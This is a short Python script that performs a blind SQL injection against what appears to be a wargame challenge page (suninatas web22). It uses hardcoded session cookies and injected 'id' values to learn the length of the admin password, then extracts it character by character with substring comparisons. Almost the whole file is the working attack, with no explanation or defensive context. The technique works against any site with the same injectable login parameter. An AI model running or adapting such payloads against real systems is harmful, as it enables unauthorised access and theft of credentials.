#!/usr/bin/python

import requests as req

cookies = {"ASP.NET_SessionId":"sbd2hldgbghcshskmhnubw2g", "ASPSESSIONIDSADBSAQD":"ONINCAKAHJGGDDMKBANMGNNP"}
url = "http://suninatas.com/challenge/web22/web22.asp"
maxpass = 15
length = 0
password = ""
parameter = {"pw":"haha"}

for i in range(maxpass):
    parameter['id']="admin' and len(pw)={}-- ".format(i+1)
    response = req.get(url, cookies=cookies, params=parameter)

    if response.text.find("OK") != -1:
        length = i+1
        print("Password length is {}".format(length))

for i in range(1, length+1):
    for j in range(32, 128):
        parameter['id'] = "admin' and substring(pw, {0}, 1)='{1}'--".format(i, chr(j))
        response = req.get(url, cookies=cookies, params=parameter)
        if response.text.find("OK") != -1:
            password += chr(j)

print("admin's password is " + password)

